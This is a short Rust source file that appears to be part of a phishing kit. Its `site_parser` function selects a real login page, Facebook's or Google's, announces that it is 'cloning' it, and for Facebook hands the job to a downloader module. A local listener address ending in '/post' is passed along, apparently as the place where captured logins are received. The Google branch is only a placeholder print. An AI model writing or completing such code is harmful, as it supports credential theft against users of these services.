use std::collections::HashMap;
use crate::site_downloader;
use std::process;

pub fn site_parser(url_key: u8, localip: &str, localport: &str) {
    let localip = format!("http://{}:{}/post", localip, localport);

    let mut urls = HashMap::new();
    urls.insert(1, "https://web.facebook.com/login");
    urls.insert(2, "https://accounts.google.com/");

    if let Some(url) = urls.get(&url_key) {
        println!("Cloning URL: {}", url);
    } else {
        println!("Método no encontrado"); 
        process::exit(0);
    }

    match url_key {
        1 => site_downloader::facebook(&localip), 
        2 => println!("Gmail"),
        _ => println!("?"),
    }
}

